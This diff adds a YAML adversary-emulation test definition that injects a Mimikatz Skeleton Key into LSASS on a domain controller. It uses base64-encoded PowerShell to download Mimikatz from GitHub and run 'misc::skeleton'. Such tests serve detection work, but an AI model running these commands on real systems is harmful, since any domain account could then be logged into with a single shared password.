@@ -1,0 +1,26 @@
+- id: 27186447-0292-5c26-b1d0-90063af49bc3
+  name: Soumaia ART Tests - Skeleton Key via Mimikatz
+  description: 'Injects a Skeleton Key into LSASS on a domain controller using Mimikatz. Once injected, any domain
+
+    user account can be authenticated using the password ''mimikatz'' until the domain controller is rebooted.
+
+
+    This test must be run on an isolated domain controller and must not be performed on a production DC.
+
+    Cleanup forces a reboot of the domain controller to evict the skeleton key from LSASS memory. (requires elevation)'
+  tactic: persistence
+  technique:
+    attack_id: T1556.001
+    name: 'Modify Authentication Process: Domain Controller Authentication'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAQwA6AFwARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAE0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAEMAOgBcAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABNAGkAbQBpAGsAYQB0AHoAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGcAZQBuAHQAaQBsAGsAaQB3AGkALwBtAGkAbQBpAGsAYQB0AHoALwByAGUAbABlAGEAcwBlAHMALwBsAGEAdABlAHMAdAAvAGQAbwB3AG4AbABvAGEAZAAvAG0AaQBtAGkAawBhAHQAegBfAHQAcgB1AG4AawAuAHoAaQBwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABNAGkAbQBpAGsAYQB0AHoAXABtAGkAbQBpAGsAYQB0AHoALgB6AGkAcAAiAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAiAEMAOgBcAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABNAGkAbQBpAGsAYQB0AHoAXABtAGkAbQBpAGsAYQB0AHoALgB6AGkAcAAiACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAE0AaQBtAGkAawBhAHQAegAiACAALQBGAG8AcgBjAGUACgA=
+          }
+          & "C:\ExternalPayloads\Mimikatz\x64\mimikatz.exe" "privilege::debug" "misc::skeleton" "exit"
+        cleanup: |-
+          Remove-Item -Path "C:\ExternalPayloads\Mimikatz" -Recurse -ErrorAction Ignore
+          Restart-Computer -Force
